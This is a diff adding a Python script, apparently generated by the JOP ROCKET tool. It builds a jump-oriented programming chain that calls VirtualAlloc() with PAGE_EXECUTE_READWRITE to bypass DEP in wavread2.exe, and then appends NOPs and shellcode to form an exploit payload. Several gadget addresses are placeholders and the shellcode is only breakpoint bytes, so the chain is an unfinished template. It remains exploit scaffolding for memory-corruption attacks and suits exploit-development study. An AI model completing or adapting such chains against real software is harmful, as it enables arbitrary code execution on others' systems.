@@ -1,0 +1,55 @@
+
+* * * * * * * * * * * * * * * * * * * * * * * * * * * *
+# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call EAX #1
+
+
+import struct
+
+def create_rop_chain():
+	rop_gadgets = [
+		0x0000badd, # (base + 0xbadd) # POP Gadget not Found  Load EAX with address for dispatcher gadget!
+		0xdeadc0de, # Address for your dispatcher gadget!
+		0x0000badd, # (base + 0xbadd) # POP Gadget not FoundLoad  with address of dispatch table
+		0xdeadbeef, # Address for your dispatcher table!
+		 # JMP to dispatcher gadget; start the JOP!
+	]
+	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+
+
+
+def create_jop_chain():
+	jop_gadgets = [
+# Need stack pivots - none were found		0x45454545, # 	 No DG found - placeholder padding (4 bytes)
+		0x0040dd3b, # (base + 0xdd3b), # pop ecx # xchg dword ptr [esp], eax # jmp eax # wavread2.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop ecx
+		0x45454545, # 	 No DG found - placeholder padding (4 bytes)
+		0x0040158f, # (base + 0x158f), # jmp dword ptr [ecx] # wavread2.exe # JMP to ptr for VirtualAlloc
+		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
+	]
+	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)
+
+rop_chain=create_rop_chain()
+jop_chain=create_jop_chain()
+
+vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()
+
+vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
+vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
+vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
+vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
+vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
+vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
+vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
+vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
+vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
+#This is one possible VirtualAlloc() chain; other possibilities exist!
+
+shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
+nops = '\x90' * 1
+padding = '\x41' * 1
+
+payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly
+
+# This was created by the JOP ROCKET.
+
+
+
